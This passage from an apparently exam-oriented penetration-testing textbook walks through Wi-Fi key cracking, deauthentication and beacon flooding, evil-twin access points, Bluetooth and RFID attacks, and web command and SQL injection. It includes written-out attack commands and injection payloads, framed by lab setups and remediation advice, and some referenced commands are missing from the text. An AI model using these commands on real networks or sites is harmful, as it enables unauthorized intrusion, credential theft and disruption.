64-bit WEP key is a 10-digit key

128-bit WEP key is a 26-digit key

It will take roughly five minutes to crack either key length, given enough IVs. However, if your screen says "got 0 ARP requests" after waiting a while, start pinging invalid IP addresses from the wireless client on the target network.

8. Once you think you have enough IVs (e.g., 5,000 IVs seems to be a good amount to crack the WEP key relatively quickly), kill off the airodump-ng and aireplay-ng commands executed in the previous steps using CTRL-C to allow the command to finish writing to the output files. The .cap file is a PCAP file that can also be replayed in Wireshark. Here's an example IV captured in the WEP parameters of the broadcasted packet.

9. Now, you can use aircrack-ng to crack the WEP key for the target AP, using the IVs captured from step 3. You may have multiple .cap files. You can use a wildcard to specify all of the files and let aircrack-ng sort them out:

# aircrack-ng -b \<target MAC\> wep-output\*.cap

The command is as follows:

• -b MAC of the target AP

TIP Another way to accomplish WEP key recovery when there are no clients on the network is by executing a fragmentation attack. This type of attack will speed up the cracking process by injecting arbitrary packets into the wireless access point but does not actually crack the key. The fragmentation attack exploits the pseudo-random generation algorithm (PRGA) sequence in RC4, where after 4,096 packets, 2 will likely share the same IV and thus the same RC4 key. In Kali Linux, you can use aireplay-ng with the fragmentation attack option (-5) to recover the PRGA and then use the packetforge-ng command to carry out the injection attack and ultimately recover the WEP key. You can read more about these types of attacks at www.aircrack-ng.org.

### Cracking WPA-PSK and WPA2-PSK

WPA and WPA2 both rely on the four-way handshake and authentication method. Refer to Figure 4-5 if you need a refresher on the four-way handshake. We can use the same basic method for cracking them. While they use different encryption protocol strengths, both are susceptible to brute force. First, assume you can capture the handshake. Let's take inventory of what you know based on what is available to you on the network:

• The SSID of the AP and the supplicant

• The MAC of the AP and the supplicant

• The ANonce and the SNonce (message 1 and message 2)

• The algorithm used to generate the PMK

• The MIC (from message 2 and 3)

This means that if you can capture the four-way handshake, you can use the information you know along with a dictionary of guesses to generate a PMK of your own. Then you can test that generated PMK using the MIC to see if it's valid for the network.

Now, here's an exercise using the Aircrack utilities to crack a WPA2 network using a preshared key. We assume that you are attacking a test WPA2 network configured with a simple password that is susceptible to a dictionary attack, that the network has at least one wireless supplicant on the network, that you can deauthenticate that supplicant at will, and that you are using Kali Linux as your attack host. Before you begin, you should follow Steps 1–3 from the WEP exercise to identify the appropriate channel and MAC address of the target AP hosting your test WPA2 network. If you know those details already, you can proceed. Our first goal is to try to collect the handshake.

1. Start airodump-ng. Wireless clients will appear under the STATION column and will report the BSSID of the AP they are connected to. The following illustration shows an example of starting airodump-ng to collect a handshake against the target AP on channel 4.

The command options are as follows:

• -c The channel you are camping on

• --bssid MAC of the target AP

• -w Output file containing the four-way handshake

• \<interface\> Your wireless interface name

# airodump-ng -c 4 --bssid \<target MAC\> -w \<outfile\> \<interface\>

2. If you are patient enough, you can wait for a client to deauthenticate from the network naturally, you will capture the handshake, and airodump-ng will report the handshake in the top-right corner of the terminal window. However, to force the issue, you can use aireplay-ng to deauthenticate an existing wireless client from the network to capture the four-way handshake. An example of capturing the handshake after deauthenticating a Windows client from the network is shown next. Open up a separate terminal window and execute aireplay-ng using the following command syntax:

# aireplay-ng -0 1 -a \<target MAC\> -c \<target MAC\> \<interface\>

The command options are as follows:

• -0 Deauthentication

• 1 How many deauthentications to send to the wireless client

• -a MAC of the target AP

• -c MAC of the target wireless client

• \<interface\> Your wireless interface name

TIP Deauthenticated wireless clients may connect to a different network that it knows about, which would prevent you from capturing the handshake until it comes back to the network you're on.

3. Once you capture the handshake with airodump-ng, you can use a dictionary attack (rather than brute force, as with WEP). Use aircrack-ng and your favorite wordlist to crack the PSK found in the handshake. Kali includes a few wordlists located in /usr/share/wordlists. For this exercise, we used the rockyou.txt list located in the wordlists directory, shown in the following illustration, to successfully crack the PSK. Use CTRL-C to close the terminal window you were running airodump-ng from, then use the following command syntax to crack the WPA PSK:

The command options are as follows:

• -w Wordlist (dictionary)

• -b MAC of the target AP

• \<outfile\> Output file containing the four-way handshake

Other methods are available to crack the WPA/WPA2 PSK, depending on your tool preference and the level of complexity required to recover the PSK. In Kali, the genpmk command can be used to build a PMK table (rainbow table) by precomputing the hashes and saving them into a hash file. Then, you can use the cowpatty command, along with the four-way handshake from a PCAP file and genpmk hash file, to crack the WPA/WPA2 key. In turn, the hash file can be reused in future engagements to help speed up the cracking process.

Many prefer to use hashcat to execute a dictionary, brute-force, or rule-based attack because graphics processing unit (GPU)–based password guessing is often much faster. Hashcat does not support handshakes in the PCAP format. However, you can use the cap2hccapx utility from hashcat-utils to convert the .cap file over to hashcat's own "hccapx" file format. The hashcat-utils project includes helpful binaries to assist with complex password cracking. You can download the latest release from https://github.com/hashcat/hashcat-utils/releases, which includes source code and precompiled binaries for both Windows and Linux operating systems. The latest release at the time of writing this book was hashcat-utils-1.9.7. After downloading the hashcat-utils prebuilt binaries or compiling the source code, you can convert the PCAP format over to hccapx by executing the cap2hccapx command using the following syntax:

# ./cap2hccapx \<outfile\>.cap \<newfile\>.hccapx

The command options are as follows:

• \<outfile\> PCAP file containing a four-way handshake collected from airodump-ng in step 1

• \<newfile\> Name of the new hccapx-formatted file to create

If the command was successful, it will print out to the terminal how many WPA handshakes it wrote to the new .hccapx file. Before executing hashcat, verify that it can see your GPU or CPU by executing hashcat –I at the command line. Check out the hashcat website (https://hashcat.net/hashcat) to ensure you have the latest driver requirements to support your environment; otherwise, hashcat may not be able to run. To execute a dictionary attack in Kali Linux against the new hccapx-formatted file with the rockyou.txt wordlist, execute the hashcat command using the following syntax:

# hashcat –m 2500 \<newfile\>.hccapx rockyou.txt

The command options are as follows:

• -m The hash type to use (i.e., 2500 = WPA/WPA2)

• \<newfile\> Name of the hccapx-formatted file

If the command executed successfully, you should see the plaintext value of the key. The hashcat website provides a wiki with additional guidance on how to brute-force attack the hccapx file using combinations for calculating the length, character type, and so on and rule-based attack methods for mutating a wordlist using a predetermined set of rules to make certain letters uppercase, lowercase, etc. These types of methods help improve the efficiency of the attack.

Attacking the Dragonfly Handshake (Dragonblood Attack2)

Remember that WPA3 implements SAE, also referred to as the Dragonfly key exchange. The Extensible Authentication Protocol-Password (EAP-PWD) authentication method, which is used in some Enterprise networks, also uses Dragonfly handshakes and may be vulnerable to some of the same attacks. Research by Mathy Vanhoef and Eyal Ronen has revealed this is vulnerable to multiple types of attacks, even despite the implementation of additional security measures.

Their research proposes that WPA3 connections can be tricked into downgrading to a weaker protocol (such as WPA2), or choose a weak security group using a rogue AP and forged messages, or discern information about the password based on timing of responses to commit frames. We'll talk more about rogue AP attacks later in this chapter. But attackers can use the Dragonslayer proof of concept to attempt to bypass authentication using a valid username, use the Dragontime proof of concept to test for password leakage based on timing if certain configurations are supported by the target, and use the Dragonforce proof of concept to attempt to crack passwords based on timing attacks. These tools can be found in Mathy Vanhoef's GitHub at https://github.com/vanhoefm.

### Jamming and Other Denial of Service Attacks

Jamming Wi-Fi is illegal in the United States, according to the FCC.3 This applies to using a device to generate a radio signal designed to interfere with an otherwise legitimate radio signal, such as a Wi-Fi or cellular network. However, denial of service through protocol abuses is still legal and may be something you need to do during a penetration test. For example, if you need to force a target to connect to your device in order to capture traffic, you may need to temporarily target the other network.

Obviously, you need to be cautious when launching denial of service attacks and be certain their impact falls within your authorization for testing. You can use a tool such as mdk4, which is part of the aircrack-ng suite of tools, to launch denial of service attacks such as:

• Beacon flooding, which may show fake APs to clients

• Overwhelming APs with authentication frames

• Sending repeated deauthentication and disassociation packets to clients to force them off the network

• Intentionally triggering defense lockouts (Michael countermeasures in TKIP)

• Sending fake sessions to flood APs

Let's run through a quick example of how you might use this tool.

1. First, install the tool in Kali if it is not already installed.

$ sudo apt install mdk4

2. It has to run as root, so you will either need to type sudo for each of these or sudo su – to change your user context. To get help, you can look at a single module. The following will show the help for the beacon flooding module:

$ sudo mdk4 --help b

3. Let's use this to flood the nearby area with a bunch of false AP names. This will use our wireless interface wlan01, -b to specify beacon flooding mode, -a to generate SSIDs with nonprintable characters and use SSIDs larger than 32 bytes, -m to use valid MAC addresses by manufacturer for the false APs, and -s to send 500 packets per second.

sudo mdk4 wlan01 -b -a -m -s 500

4. Now, when clients look for wireless networks, they'll see a ton of garbage APs to choose from.

Rogue Access Points

Depending on the rules of engagement for the pentest, you may be authorized to target the communications of wireless targets on the network in order to harvest credentials or sensitive data that could help aid with further target development and exploitation. One way to do this is to act as a fraudulent Wi-Fi access point, otherwise known as the evil twin. HostAP (in Kali Linux: apt-get install hostapd) is a popular access point software that can be run from a computer operating system such as Kali Linux. It allows the host to perform all functions of a typical wireless router.

EXAM TIP Rogue AP attacks may be used for targeting Enterprise implementations that rely on RADIUS. Attack tools such as HostAP and EAPhammer can launch attacks like the Karma attack that will help target these networks. You can also use airbase-ng and aireplay-ng.

For WPA and WPA2 enterprise networks, HostAP provides support for RADIUS authentication and supports the ability to carry out impersonation attacks against wireless clients. Hostapd-wpe supports impersonation against the various authentication protocols, including the Password Authentication Protocol (PAP), Challenge-Handshake Authentication Protocol (CHAP), and Microsoft's version of CHAP (MS-CHAPv2). Once a client connects and sends user credentials (which in many cases can be a username/password hash from Active Directory), hostapd-wpe can be configured to send an EAP success message to the client, which can trick the client into thinking it just authenticated to the legitimate RADIUS authentication server.

Additional offline and on-path attacks can be executed at this point, such as cracking the NTLMv2 hash or providing networking connectivity through a Dynamic Host Configuration Protocol (DHCP) lease, Domain Name System (DNS) redirect, and so on. Implementing server certificate validation is one way to mitigate against this type of impersonation attack. However, the weakest link would be the user if he or she accepts the unknown or self-signed server certificate warning prompted during authentication to the malicious AP. The hostapd-wpe tool is a modified version of the HostAP software to help facilitate on-path attacks such as evil twin and the Karma attack. More information can be found at https://tools.kali.org/wireless-attacks/hostapd-wpe.

The Karma attack is an AP method used to listen for any network probe request from a client to join a given network, not just one specifically targeted network, like the evil twin attack. In turn, it will rebroadcast the ESSID from the victim in order to entice the victim to connect to the evil network. For example, if you leave wireless enabled on your mobile device and run out to the store to do some shopping, your phone will probe for networks that it has previously associated with. If you have ever connected to an open access network, it's very likely that your phone will at some point try to connect to that SSID if the wireless card is not already connected. This could leave your phone susceptible to a Karma attack, as the evil twin only needs to know the SSID value of the network to duplicate, not a PSK.

Another way to impersonate the SSID of the network is to use the Airbase-ng utility. Using Kali Linux, you can execute the following command to create the "evil twin" of a legitimate network:

# airbase-ng –a \<bssid\> –-essid \<wireless name\> –c \<channel\> \<interface\>

Once you have the network up and running, you will need to force the clients to connect. To do that, you can simply issue deauth packets with aireplay-ng. The clients will all disconnect from the AP and attempt to reconnect to the network. Using Kali Linux, you can execute the following command to force the clients to deauthenticate from the legitimate AP:

# aireplay-ng –deauth 0 –a \<target AP MAC\> \<interface\> –ignore-negative-one

CAUTION If not all the clients reconnect to your evil twin AP, you can boost the signal of your wireless card to be stronger than the legitimate one, or try and get as close as you can to the wireless clients you want to target. Boosting the power on your wireless NIC can be dangerous and illegal in some countries. The default Tx-Power setting is typically 20 dBm but can increase to 30 dBm by changing your wireless card regulation settings with iw reg set BO then iwconfig \<interface\> txpower 30. Doing so can cause your network card to overheat and possibly damage the wireless NIC or your testing device.

### Session Hijacking

Once you have wireless clients connected to your evil twin AP, you can start monitoring and capturing their traffic using Wireshark. When network users log in to websites, a session cookie is created for the session. If you can extract the session cookie from the HTTP session, you can leverage the session to interact with a target website. This could be a convenient way of escalating privileges on the network through administrative consoles.

NOTE Unless you can act as a passthrough between your targeted WLAN user and the website they request (because your device is connected to the Internet or intranet, depending on your target), an evil twin attack can't help you much with session hijacking.

### Attacking Bluetooth

The 802.15 group of standards defines specifications for various categories of wireless private area networks (WPANs), including Bluetooth and ZigBee. Both technologies run on the same wireless frequency band (2400 to 2483.5 MHz within the 2.4 GHz frequency band). ZigBee is a mesh network protocol that was designed to carry lots of data packets over short distances. Bluetooth is similar, in the sense that it also carries data over short distances. Bluetooth can be found in different consumer technologies, including speakers, printers, headphones, keyboards, and mobile phones. Much like Wi-Fi, Bluetooth is susceptible to various types of data exfiltration and remote exploitation attacks due to common vulnerabilities such as:

• Legacy or faulty Bluetooth implementations

• Short PINs that are susceptible to brute-force attacks

• Users pairing Bluetooth devices in public places

We will cover these types of attacks further in the next few sections.

### Primary Layers of Bluetooth

Bluetooth contains multiple layers in its protocol stack. The following are the primary layers of the stack:

• SDP Service Discovery Protocol discovers Bluetooth services offered from other devices within range.

• LMP Link Managing Protocol keeps track of connected devices.

• L2CAP Logical Link Control and Adaptation Protocol provides data services to upper layers of the Bluetooth protocol stack.

• RFCOMM Radio Frequency Communication uses L2CAP to provide emulated serial ports to other devices.

• TCS Telephony Control Protocol uses L2CAP and provides telephone functionality.

### Bluetooth Specifications

Bluetooth is designed to have a much more limited range compared to Wi-Fi, for example. This makes it ideal for computing peripherals and small consumer appliances. Bluetooth Low Energy (BLE) is slower, but it uses less power over time, making it ideal to power Internet of Things (IoT) and machine-to-machine (M2M) applications like Fitbits and blood pressure monitors while supporting years-long battery life. Table 4-3 shows Bluetooth, Bluetooth 4.0 LE, and Bluetooth 5.0 LE for comparison.

![](RackMultipart20240405-1-nwk5q_html_bb5d7ac274b30eee.png)

### Table 4-3 Bluetooth Implementations Compared

### Device Discovery

Information gathering is the first step in hacking Bluetooth-enabled devices. This process is called Blueprinting. BlueZ (http://www.bluez.org) is the default protocol stack for Bluetooth in most Linux distributions, including Kali Linux. BlueZ includes default capabilities that can be used to enable or disable your Bluetooth adapter and can also be used for basic reconnaissance during the information gathering process. In order to be able to test or discover remote Bluetooth devices, you need to have a compatible adapter (USB dongle). In Kali, you can verify the existence of your Bluetooth adapter (built-in or USB) by executing the hciconfig command at the command prompt. If your adapter exists, you will see the MAC address and other device information, much like running the ifconfig or iwconfig command. To enable the interface, type:

hciconfig hci\<#\> up

Once the interface is enabled, you can use the hcitool command in Kali Linux to discover and inquire about other devices, authenticate to devices, and much more. Use the --help option to list additional command options. The bluelog scanner is another command-line utility installed in Kali Linux that can assist with Bluetooth device discovery. To see a full list of discovery tools available in Kali Linux, check out https://tools.kali.org/tag/bluetooth.

NOTE Ubertooth (http://ubertooth.sourceforge.net) is a development platform suitable for experimenting with Bluetooth. If you are not up for the challenge of building your own Bluetooth testing adapter, the Ubertooth One (you can purchase it through Amazon) is the hardware platform (USB adapter), customized and tweaked to support the installation of tools from the Ubertooth platform.

### Bluetooth Attacks

Bluetooth is a chatty protocol, and when a device is within range, it can be targeted and exploited, making it difficult for the user to know that something malicious is even happening. Once you have fingerprinted a list of Bluetooth devices, you can carry out additional remote attacks such as stealing and harvesting sensitive information from a mobile device.

Bluesnarfing is the process of exploiting vulnerabilities found in certain Bluetooth firmware in order to steal information from a wireless device. Successful attacks are capable of stealing contacts, calendar info, e-mail, and text messages when the Bluetooth device is turned on and set to discoverable mode. In the past, a vulnerability in certain vendors' firmware could be exploited, and device pairing could be completed without the acknowledgment of the user. Bluesnarfer is a tool in Kali Linux that is capable of carrying out this method of attack.

NOTE Modems have been around for decades. The AT commands are instructions used for controlling modems. This capability is outside the coverage area for this book; however, you can read further about vulnerability analysis of AT commands within mobile platforms (like Android) here: https://atcommands.org

Whether it's unwanted mail, e-mail, or text messages, spam can be aggravating and can be used both by legitimate businesses to entice consumers to buy certain products or by spammers to entice a victim to download some software, click on a link, or wire some money. Unwanted messages can also be delivered via Bluetooth. We will discuss some of these methods in the next few sections.

One method of sending unsolicited messages to mobile users is called bluejacking. This method transmits data to the device without the knowledge of the user. Typically, this type of attack can be carried out by sending an electronic business card via Bluetooth to an unsuspecting victim. Instead of putting a real name in the name field, you can insert a sneaky message. To counter this type of attack, mobile phone makers limit the amount of time a phone can be in discovery mode for pairing. This helps lessen the window of attack against Bluetooth devices.

### RFID and NFC

Radio frequency ID (RFID) is system that consists of a transponder (tag) and a reader with an antenna. The tag can be unpowered (passive) or have its own source of power (active). Passive tags are powered by the reader. They respond with a value (often a static value) when in proximity of the reader. A familiar example is some employee ID badges. Active tags are always broadcasting their data, and it is received by a reader. A familiar example are tollway passes for your car. RFID tags are low frequency (LF) or high frequency (HF) and have a range measured in centimeters, or they are ultra high frequency (UHF) with a range of more than a meter.

NFC devices are RFID devices and operate on the same frequency as HF RFID. NFC devices can act as both an antenna and a transponder and can participate in peer-to-peer transactions over a very short range (centimeters). Since they can receive and transmit and often have computational capability, they are often party to more complex authentication protocols. These are often implemented in contactless payment systems, cell phones, and some access control systems. Both RFID technologies implement various protocols for authentication. Some implementations are prone to similar attack approaches, including on-path attacks, cloning, brute-force attacks, amplification attacks, and replay attacks.

Devices such as the ESPKey (https://redteamtools.com/espkey) are so small that they can be installed to intercept traffic between a tag and reader without arousing suspicion. They can receive a signal, log it, and pass it through to a legitimate reader in the simplest form of on-path attack. These attacks often involve modifying existing readers, which may change their appearance, or placing a device on top of the legitimate device much like a skimmer. Anti-tampering mechanisms, such as security tape, special screws, or tamper-proof wiring, are typically effective measures against these attacks.

RFID cloning (or badge cloning) is the process of reading a series of bits from one RFID card (or key fob) and writing the same series of bits to another compatible card. Proximity readers are common security access mechanisms found in commercial applications using contactless card technologies (proximity cards or prox cards) controlled through RF. The biggest difference in proximity readers is how they are connected to the access control system—either through a wireless or wired connection.

Proximity cards are legacy technologies that are typically LF band at 125 to 134.2 kHz. The card will broadcast a 26- to 37-bit key/number, which is configured by computer software. When the key fob/card is presented at a proximity card reader, it can be no more than 15 inches away. The key fob/card data is read and sent to the controller to either grant access or deny it. When access is granted, the controller releases the physical locking mechanism to allow the door to be opened. At the time of this writing, you could purchase an RFID reader/writer, such as the one shown in the illustration, through Amazon for under $100 USD.

TIP The "RFID Hacking: Live Free or RFID Hard" presentation done at Black Hat USA 2013 (https://blackhat.com) is still a great reference for RFID hacking.

Brute-force attacks are time consuming and conspicuous when the system logs are being actively monitored. However, if you can gather enough intelligence about the system to make an educated guess about the protocol in use or the range of identifiers used by the system, you may be able to use hardware devices such as the Proxmark Pro (https://proxmark.com/) to generate random combinations of RFID identifiers and send them to the reader in an effort to force the system. These attacks must typically be performed within close proximity. Systems that implement built-in delays are resistant to these attacks.

Normally, these devices have a very short range. But what if you could amplify the signal and increase that range? The Tastic RFID Thief device uses a modified RFID reader with internal storage and an increased range to collect information from access badges from a distance of multiple feet. This data can then be used to clone badges from people as they walk by. BishopFox maintains an excellent article with walkthroughs for construction of the device and with videos of the device in use here: https://resources.bishopfox.com/resources/tools/rfid-hacking/attack-tools/

Most of these attacks rely on a static value being transmitted from the RFID tag. Access control systems that implement more complex protocols or use NFC devices with the capability to handle a secure handshake are not susceptible to these attacks. Other mitigations include monitored logging and security cameras, forced delays or lockouts, secure tag storage (such as a signal-blocking sleeve), and physical antitamper mechanisms.

## Chapter 5: Web and Database Attacks

In this chapter, you will learn about

• The OWASP Top Ten

• Research attack vectors for application-based attacks

• Various types of application-based attacks

• Complete various exercises to understand web testing tool behavior

During a pentest, you likely will come across some type of application or database server that will be in your list of authorized targets. When you identify these targets, you'll need to know how to identify the best attack vector, tools, and attacks to use. But you'll also need to know what mitigations work best. Remember, your value as a pentester is to help make security better with usable and effective report recommendations.

### OWASP Top Ten

In Chapter 1, we learned about the OWASP project. One of the resources OWASP provides is the OWASP Top Ten. In this chapter, we'll go into more depth about many of these attacks and remind you that being able to identify these attacks and the most appropriate mitigations may be important to your efforts during the exam. The OWASP Top Ten provides community awareness of the most serious web application security risks for a broad array of organizations. The data is compiled statistically from various firms that specialize in application security. Primarily, this list is put together to help organizations understand the importance of securing web services and the effects certain weaknesses can have on an organization.

### Injection Attacks

Injection attacks are typically found where there are insecure user-controlled values. Examples are forms and parameters in the uniform resource identifier (URI). When testing, you should inspect application parameters for possible injection points that may not be validated by the web application—either through client-side code (JavaScript) or using server-side code, like PHP.

As an example of client-side code, Hypertext Markup Language (HTML) form validation can be handled through JavaScript, where data entered into user-input fields (e.g., Name, E-mail, Address, etc.) can be processed through a JavaScript function when the user clicks on the Submit button. If the input field contains invalid data, the form page will not be submitted. However, this process is on the client side, and input can be manipulated by the user to bypass this type of inspection.

Server-side code can provide an additional layer of protection by using similar validation rules to ensure data is validated and properly sanitized (i.e., removing invalid characters) during postprocessing. However, both may be vulnerable to injection attacks if the user-controlled input is improperly secured. In this section, we will dive deeper into different kinds of injection attacks.

EXAM TIP Be able to recognize the types of injection and understand the appropriate remediation for each.

### Command Injection

First, let's talk about command injection attacks. Specifically, let's talk about how they work, how we can leverage Metasploit to help build custom payloads using msfvenom, and how we can use those payloads with a multi/handler in order to generate a Meterpreter session. If we have a Meterpreter session, we can attempt to escalate privileges and to pivot further into the target organization's network.

NOTE For these exercises, we downloaded the ISO disk image from the "Web for Pentester" exercise from the Pentester Lab website. This ISO is also provided with the online content that accompanies this book (see the appendix for details). For this exercise we assume you have a working, updated copy of Kali Linux and some type of virtualization software (e.g., VMware Workstation, VMware Player, Oracle VirtualBox, etc.) to host the ISO disk image.

1. Once you power on the VM, open your web browser and navigate to the home page located at http://\<vulnerable vm ip\>.

2. Given the following vulnerable web parameter ip=, we can test various command injection attacks, the first being what type of operating system and architecture the web application is hosted on. Here's an example output when appending uname -a in the vulnerable parameter. We're looking for signs of what this calls in the background. So, look at the response as well as what displays.

3. Now that we know the architecture is x86 and the host OS is Linux (Debian), let's create an exploit using msfvenom to generate a reverse Meterpreter shell payload that we can receive a callback from, using the Metasploit multi/handler. First, let's generate the exploit called "cmd" with msfvenom, using a reverse Meterpreter payload for the x86 Linux architecture to connect back to your IP address and local port (4444/tcp):

4. Then use Python to host a web server on port 80, using the SimpleHTTPServer module in the same directory where the "cmd" exploit is located:

# python3 -m SimpleHTTPServer 80

5. In another terminal window on your Kali box, launch msfconsole and type the following commands at the msf\> prompt:

6. Now, let's string together a series of commands to get our target to download the exploit, add an execution bit to the exploit, and then execute it so we can get a reverse shell. From your web browser, append the following command syntax to the ip= parameter and then execute the HTTP GET request:

7. The web server should execute the wget first to download the "cmd" exploit from your Python SimpleHTTPServer, then append the execution bit using chmod, then execute the exploit; in return you should see a Meterpreter session spawn from within Metasploit, as shown in the example here:

NOTE For more practice, Portswigger has some additional exercises here: https://portswigger.net/web-security/os-command-injection

### Recognizing Command Injection

Command injection often involves abuse of application programming interface (API) functions with names like exec, eval, cmd, or system. Anything that references a process (like os.popen in Python or proc\_open in PHP) may also warrant close attention. Often, you'll see these as .cgi files, .pl files, or .sh files or see parameters after a ? in a URI. Look for OS commands like whoami, ls, dir, and others in examples. Following is a simple example.

URI before attack:

http://vulnerable-site/shopping?id=3856&name=AndersonPeachCobbler

URI after attack:

http://vulnerable-site/shopping?id=1|ls&name=AndersonPeachCobbler

This lists the contents of the current directory. Read more about testing for command injection in OWASP's Web Security Testing Guide under the section Testing for Command Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/12-Testing\_for\_Command\_Injection.

Remediation:

1. Avoid having the application call commands directly in the OS.

2. Use programming options to escape the command for the underlying OS before sending the command.

3. Parameterize and perform input validation by using an allowlist for characters (potentially problematic characters include |, &, ;, \>, \<, !, ', and \).

4. Run applications at the lowest possible privilege.

### SQL Injection

In order to test for SQLi, you need to have some level of understanding of the commands and syntax used to carry out operations on a database. Structured Query Language (SQL) is used to manage data within remote database management systems (RDMSs). There is an online reference at www.sql-workbench.net/dbms\_comparison.html that provides a comparison of common SQL features that can be used in SQL statements across different RDMSs.

NOTE Within this chapter, we will be discussing and utilizing SQL command syntax relevant for the MySQL RDMS.

Common SQL terms you should be familiar with are shown in Table 5-1.

![](RackMultipart20240405-1-nwk5q_html_a958ab16c5e50aa1.png)

### Table 5-1 Common MySQL Commands

Finding Injections

To evaluate if a parameter is injectable, like the id= field, you may need to try a series of injection criteria to elicit an error from the database. Parameters containing string values will look similar to the following in a web GET or POST request:

http://example.com/test.php?name=John%20Smith

In this case, %20 is URL encoding for white space. URLs processed by a web server or application cannot include spaces. Thus, URL encoding helps replace potentially harmful ASCII values with a % and two hexadecimal digits. Integer values will typically look similar to the following in a web GET or POST request: http://example.com/test.php?id=1

TIP You can learn more about URL encoding and other web concepts such as HTML, CSS, and JavaScript at www.w3schools.com.

The following example PHP code shows how the HTTP GET request for the "id=" value might be processed on the server:

The mysql\_query() function in the PHP code will build a query against the my.store table and return all selected data where the ID field matches the given request. The mysql\_fetch\_assoc() function will return the resulting array of values produced from the query.

Error-Based SQL Injection

When the database returns information about the programmed query structure in an error message or application response, attackers can use the information returned to craft an attack against the program's logic. Here's an example of an error-based result:

Blind SQL Injection

In the case where the web server presents a generic error such as, "Sorry, your search criteria is incorrect," the parameter may still be vulnerable, but you have an invalid query and need to troubleshoot it. In order to troubleshoot the query, you could use what is called blind SQLi, which is another way to exfiltrate data from a database when you can't see the database output. Two common methods you can use to exploit blind SQLi are Boolean-based and time-based. Boolean-based SQLi is where you ask the database true (e.g., id=1 AND 1=1) or false (e.g., id=1 AND 1=2) questions and determine the answer based on the response given by the application, where the response could be a content error or a blank page. Time-based SQLi relies on the database pausing (or sleeping) for a given amount of time, then returning the results, indicating that the SQL query executed successfully. For instance, executing a time-based SQLi against the mysql\_query() from the example PHP code might look something like this:

http://example.com/test.php?id=1 and sleep(5)--

If the id= parameter is susceptible to blind SQLi, there will be a five-second delay in the web page loading. From this point, you could continue to use blind SQLi to enumerate valid characters that make up the database name, table names, and possibly passwords/hashes from the mysql.user table, depending on the permissions given to the database user executing the queries. This is a type of linear search, where each value is evaluated until you find the correct character:

• If the first letter of the database name is an "a," wait for five seconds.

• If the first letter of the database name is a "b," wait for five seconds.

A binary search is another method that can help speed up blind SQLi attacks, where the position of a target value can be identified from within a sorted array. How this works is the binary search would determine the middle element of the array and compare it to the target value (the array would be all of the characters that make up the ASCII table). If the middle element matches, it is returned. However, if the value is greater than the middle element position, the lower half of the array is discarded from the search and only the remaining upper half is used within the search criteria. The "Faster Blind MySQL Injection Using Bit Shifting" paper on the Exploit Database website (https://www.exploit-db.com/papers/17073) provides examples of how to optimize binary search during blind SQLi attacks.

Blind SQLi is time consuming, but very possible. Follow along with an exercise as we demonstrate how to use sqlmap to test and evaluate web parameters for SQLi vulnerabilities in the My Awesome Photoblog PHP web application.

NOTE This example assumes you have downloaded the ISO disk image from the "From SQL Injection to Shell" exercise from the Pentester Lab website. This ISO is also provided with the online content that accompanies this book (see the appendix for details). For this exercise we assume you have a working, updated copy of Kali Linux and some type of virtualization software (e.g., VMware Workstation, VMware Player, Oracle VirtualBox, etc.) to host the ISO disk image.

1. Once the vulnerable VM is up and running in your testing environment, navigate to the web page hosted by the VM: http://\<ip address\>.

2. If you click on Test from the menu bar, you will be taken to another page that renders additional images posted to the blog page. The URL is populated with the following:

http://\<ip address\>/cat.php?id=1

3. Let's go ahead and test the id= parameter by inserting a single quote (')behind the number in the id field, as follows: "?id=1'". After submitting the URL back to the web application, you should receive the MySQL 1064 error we discussed previously.

4. Now that we know the database is processing our request and the application is not validating the input and filtering out special characters from the request, we can test the parameter with sqlmap. From the command line in Kali Linux, execute the following:

# sqlmap -u "http://\<ip address\>/cat.php?id=1"

The sqlmap command should identify the database as MySQL and will ask if it should skip the payload testing for other RDMSs. Type Y and press enter. Then type Y again to include all tests for MySQL and type N when asked to keep testing other parameters.

NOTE sqlmap will output the results (log, target.txt, and session.sqlite) under your user home directory (/root if using Kali) in .sqlmap/output/\<ip address\>.

5. If we investigate the log file, we will see that the id parameter was evaluated with an HTTP GET request and was found to have multiple injection types, including

• Boolean-based blind

• Error-based

• AND/OR time-based blind

The following illustration shows the injection types along with each given payload that was tested with sqlmap to demonstrate that injection was possible.

6. The next step is to use sqlmap to exploit the SQLi vulnerabilities in order to read arbitrary data from the database. If you notice the PHP web application menu bar, there is an Admin login page. Let's see if we can extract the users and possibly hashes from the database in order to compromise login access. Since this is a lab environment, let's run the same sqlmap command we used in Step 4, but append "-a" to the command syntax and let sqlmap execute anything and everything against the MySQL database, using the privileges of the database user we are executing the queries as. You will see that sqlmap was able to extract the user and hash from the "users" table of the "photoblog" database. It was also nice enough to ask if we wanted to use a wordlist to crack the MD5 hash. You can just press ENTER to continue with the defaults. In a minute or two, SQL map should be able to crack the hash using its default wordlist.

7. The sqlmap results are again stored in /root/.sqlmap/output/\<ip address\> to include a new directory called dump that has subdirectories for each database sqlmap could discover and enumerate information from. The dump/photoblog/users.csv file contains the username and password to use for logging into the Admin page. Here's a successful login to the Admin page for the Photoblog application:

TIP Instead of capturing everything with sqlmap using the -a option, you could strategically investigate what you are looking for by using --tables to look for all of the tables from the current database the application is querying from for the given HTTP parameter. Then you could use --sql-query="select \* from photoblog.users" and return each record from the Users table. Then take the MD5 hash retrieved from sqlmap and pass it to a wordlist, using rules, with John the Ripper (JtR): # john --format=Raw-MD5 –-rules --wordlist=rockyou.txt \<hash file\>

On a separate note, testing everything with sqlmap using the –a option could be dangerous. Running simultaneous queries could inadvertently crash the database during testing if the database is already operating at full capacity. It is good practice to monitor the health and status of the database/web server after executing queries that could leave the database hanging, such as in the case with time-based attacks. SQL injection attacks and the use of sqlmap during the engagement should bear further discussion with the client when operating in a production environment to ensure the customer understands the potential risks imposed by the use of automated SQL injection testing tools.

Union Query SQL Injection

This type of injection builds two or more SELECT() statements that already exist within the application to create a single result in the application response. This is often useful in getting information from parts of the database that are not designed to be exposed to part of the application that allows user interaction. To perform a successful UNION attack, both queries must return the same number of columns and the data types in each column have to match.

You can figure out the number of columns using "ORDER BY" until you get an error back from the database. It will usually say something about the parameter being out of range. Here's an example of input:

And the error:

Another way is to use NULLs in a UNION SELECT statement until you have enough to match the queries and the error condition stops. Here's an example of input:

This method is popular because you can also use it to figure out the data types of each column by trying a different value to NULL in each column:

An error will indicate when the type does not match a particular column, allowing you to figure out the right one for your attack. You can read more about these at https://portswigger.net/web-security/sql-injection/union-attacks.

Stacked Queries SQL Injection

